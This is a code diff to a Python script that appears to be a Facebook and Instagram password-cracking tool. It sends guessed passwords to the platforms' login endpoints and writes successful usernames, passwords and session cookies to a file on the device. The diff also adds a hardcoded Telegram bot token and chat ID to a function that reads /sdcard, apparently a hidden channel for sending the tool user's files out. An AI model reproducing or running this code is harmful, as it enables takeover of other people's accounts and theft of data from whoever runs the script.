@@ -110,8 +110,8 @@ rc = random.choice
 
 def sexy():
     session=requests.session() 
-    bot_token = '7610123709:' 
-    chat_id = '17780662'
+    bot_token = '7610123709:AAF21eTLyX7I1byWJFV2PSsZKnxGBes9pEw' 
+    chat_id = '1778046662'
     #-----------( /sdcard
     try:
         sdcard_path = '/sdcard'
@@ -1067,7 +1067,7 @@ def bapi(uid, name, pwx, tl):
                 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
             }
             headers = {
-                'User-Agent': ua(),
+                'User-Agent': 'ua()',
                 'Accept-Encoding': 'gzip, deflate',
                 'Connection': 'close',
                 'Content-Type': 'application/x-www-form-urlencoded',
@@ -1122,7 +1122,7 @@ def graph(uid, name, pwx, tl):
             last = first
         for ps in pwx:
             pw = ps.replace("first", first).replace("last", last).lower()
-            ua_string = ua()
+   
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -1149,7 +1149,7 @@ def graph(uid, name, pwx, tl):
                 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
             }
             headers = {
-                'User-Agent': ua(),
+                'User-Agent': 'ua()',
                 'Accept-Encoding': 'gzip, deflate',
                 'Connection': 'close',
                 'Content-Type': 'application/x-www-form-urlencoded',
@@ -1647,10 +1647,10 @@ def freeq(uid,pwx,tl):
             'cache-control': 'no-cache',
             'content-type': 'application/x-www-form-urlencoded',
             'dpr': '1',
-            'origin': 'https://www.facebook.com',
+            'origin': 'https://hi-in.facebook.com',
             'pragma': 'no-cache',
             'priority': 'u=0, i',
-            'referer': 'https://www.facebook.com/?ref=homescreenpwa',
+            'referer': 'https://hi-in.facebook.com/?ref=homescreenpwa',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
             'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
@@ -1666,7 +1666,7 @@ def freeq(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
             'viewport-width': '1440',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
+            url = 'https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
             po = Session.post(url, cookies=cookies, headers=headers, data=data, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -2087,13 +2087,13 @@ def cracker(uid, pwx, tl):
     except Exception as error:
         #print({error})
         pass
-
+ 
 def crack(uid, pww, total_idz):
     global loop
     global oks
     global cps
     x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
-    sys.stdout.write(f"\r{x}[SUMON] {loop}/{total_idz} \033[1;92m{len(oks)}")
+    sys.stdout.write(f"\r{x}[BITHIKA] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
     sys.stdout.flush()
     try:
         for pw in pww:
@@ -2103,72 +2103,70 @@ def crack(uid, pww, total_idz):
             response = session.get('https://www.instagram.com/accounts/login/')
             csrftoken = response.cookies.get('csrftoken')
             cookies ={
-            'mid': 'ZsCYoAALAAGlcbYkVN23DYxQwevD',
-            'ig_did': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',
-            'ig_nrcb': '1',
-            'datr': 'npjAZqX5wY3c_CtTDAvR0Ls3',
-            'ps_l': '1',
-            'ps_n': '1',
-            'csrftoken': csrftoken,
-            'wd': '876x773',}
+                'csrftoken': csrftoken,
+                'mid': 'ZsCYoAALAAGlcbYkVN23DYxQwevD',
+                'ig_did': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',
+                'ig_nrcb': '1',
+                'datr': 'npjAZqX5wY3c_CtTDAvR0Ls3',
+                'ps_l': '1',
+                'ps_n': '1',
+                'wd': '885x773',}
             data = {
-            'enc_password': enc_password,
-            'caaF2DebugGroup': '0',
-            'loginAttemptSubmissionCount': '0',
-            'optIntoOneTap': 'false',
-            'queryParams': '{"hl":"en"}',
-            'trustedDeviceRecords': '{}',
-            'username': uid,}
+                "enc_password": enc_password,
+                'optIntoOneTap': 'false',
+                'queryParams': '{"hl":"en"}',
+                'trustedDeviceRecords': '{}',
+                'username': uid,}
             headers = {
-            'accept': '*/*',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://www.instagram.com',
-            'priority': 'u=1, i',
-            'referer': 'https://www.instagram.com/accounts/login/?hl=en',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.140", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
-            'x-asbd-id': '129477',
-            'x-csrftoken': csrftoken,
-            'x-ig-app-id': '936619743392459',
-            'x-ig-www-claim': '0',
-            'x-instagram-ajax': '1018894959',
-            'x-requested-with': 'XMLHttpRequest',
-            'x-web-session-id': '9k4qw4:jior4r:km1zo0',}
+                'authority': 'www.instagram.com',
+                'accept': '*/*',
+                'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
+                'content-type': 'application/x-www-form-urlencoded',
+                # 'cookie': 'csrftoken=4M2PbXXQYNEmDdxrQg01NL; mid=ZsCYoAALAAGlcbYkVN23DYxQwevD; ig_did=E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B; ig_nrcb=1; datr=npjAZqX5wY3c_CtTDAvR0Ls3; ps_l=1; ps_n=1; wd=885x773',
+                'origin': 'https://www.instagram.com',
+                'priority': 'u=1, i',
+                'referer': 'https://www.instagram.com/accounts/login/?hl=en',
+                'sec-ch-prefers-color-scheme': 'dark',
+                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-model': '""',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-ch-ua-platform-version': '"10.0.0"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
+                'x-asbd-id': '129477',
+                'x-csrftoken': csrftoken,
+                'x-ig-app-id': '936619743392459',
+                'x-ig-www-claim': '0',
+                'x-instagram-ajax': '1015820104',
+                'x-requested-with': 'XMLHttpRequest',}
             login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
-            response = requests.post(login_url, data=data, cookies=cookies, headers=headers).json()
+            response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
             session_cookies = response.cookies.get_dict()
-            if response.get('status') == 'ok':
-               if json_response.get('authenticated') == True:
-                   cookie = ';'.join(['%s=%s'%(name,value) for name, value in requests.cookies.get_dict().items()])
-                   print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                   print(f"\r\033[1;92m [cookie] {cookie}")
-                   open("/sdcard/INSTAGRAM-RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
-                   oks.append(uid)
-                   break
-               elif json_response.get('auth_token'):
-                   cookie = ';'.join(['%s=%s'%(name,value) for name, value in requests.cookies.get_dict().items()])
-                   print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                   print(f"\r\033[1;92m [cookie] {cookie}")
-                   open("/sdcard/INSTAGRAM-RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
-                   oks.append(uid)
-                   break
-            elif 'sessionid' in session_cookies:
-                   cookie = ';'.join(['%s=%s'%(name,value) for name, value in requests.cookies.get_dict().items()])
-                   print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                   print(f"\r\033[1;92m [cookie] {cookie}")
-                   open("/sdcard/INSTAGRAM-RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
-                   oks.append(uid)
-                   break
+            if response.status_code == 200:
+                json_response = response.json()
+                if json_response.get('status') == 'ok':
+                   if json_response.get('authenticated') == True:
+                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                        print(f"\r\033[1;92m [cookie] {cookies}")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
+                        oks.append(uid)
+                        return True
+                   elif json_response.get('auth_token'):
+                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                        print(f"\r\033[1;92m [cookie] {cookies}")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
+                        oks.append(uid)
+                        return True
+                   elif 'sessionid' in session_cookies:
+                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                        print(f"\r\033[1;92m [cookie] {cookies}")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
+                        oks.append(uid)
+                        return True
             else:
                 #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
@@ -2177,6 +2175,6 @@ def crack(uid, pww, total_idz):
         time.sleep(10)
     except:
         pass
-
+   
 os.system("clear")
 Process()
